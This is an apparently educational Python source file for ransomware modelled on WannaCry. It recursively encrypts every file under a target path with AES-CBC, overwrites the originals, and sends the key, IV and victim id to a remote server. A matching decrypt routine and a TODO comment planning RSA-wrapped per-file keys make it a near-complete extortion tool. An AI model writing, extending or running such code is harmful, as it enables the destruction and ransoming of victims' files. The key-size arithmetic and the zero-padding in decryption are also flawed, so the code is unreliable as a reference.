from Crypto.Cipher import AES
from Crypto.Random import *
from Crypto.Util.Padding import pad, unpad
import os
import json
import base64
from binascii import hexlify


PATH = 'C:\\Users\\Dor\\Desktop\\test'  # "C:\\Users"
SIZE_BITS = 256

# TODO: use different AES fey for each file, and store keys in a file encrypted with the RSA key given by server
#       (this is the way the real WannaCry worked...)


def encrypt(client, id):
    files = []
    for (dirpath, dirnames, filenames) in os.walk(PATH):
        for f in filenames:
            files.append(dirpath+'\\'+f)

    print(files)
    key = get_random_bytes(int(SIZE_BITS / 16))
    aes_obj = AES.new(key, mode=AES.MODE_CBC)
    js = dict()
    js['id'] = hexlify(id).decode('utf-8')
    js['key'] = base64.b64encode(key).decode('utf-8')
    js['iv'] = base64.b64encode(aes_obj.iv).decode('utf-8')
    client.send(json.dumps(js).encode('utf-8'))
    del js
    del key
    if client.recv() != b'OK':
        return
    # json.dump(js, open('key.txt', 'w'))

    for f in files:
        fd = open(f, "rb+")
        plain_text = fd.read()
        enc_text = aes_obj.encrypt(pad(plain_text, aes_obj.block_size))
        fd.seek(0)
        fd.write(enc_text)
        fd.close()


def decrypt(function, key, iv):
    # js = json.load(open('key.txt', 'r'))
    # key = base64.b64decode(js['key'])
    # iv = base64.b64decode(js['iv'])
    try:
        key = base64.b64decode(key)
        iv = base64.b64decode(iv)
    except Exception as e:
        function(str(e))
        function("decryption failed...")
        return
    aes_obj = AES.new(key, AES.MODE_CBC, iv)
    files = []
    for (dirpath, dirnames, filenames) in os.walk(PATH):
        for f in filenames:
            files.append(dirpath + '\\' + f)

    for f in files:
        try:
            with open(f, "rb+") as fd:
                enc_text = fd.read()
                plain_text = aes_obj.decrypt(enc_text)
                fd.seek(0)
                pd = unpad(plain_text, aes_obj.block_size)
                if len(pd) % 16 != 0:
                    diff = 16 - len(pd) % 16
                else:
                    diff = 0
                fd.write(pd+('\x00'*diff).encode())
        except Exception as e:
            function(str(e))
            function(f + " failed decryption")
    function("done decrypting")
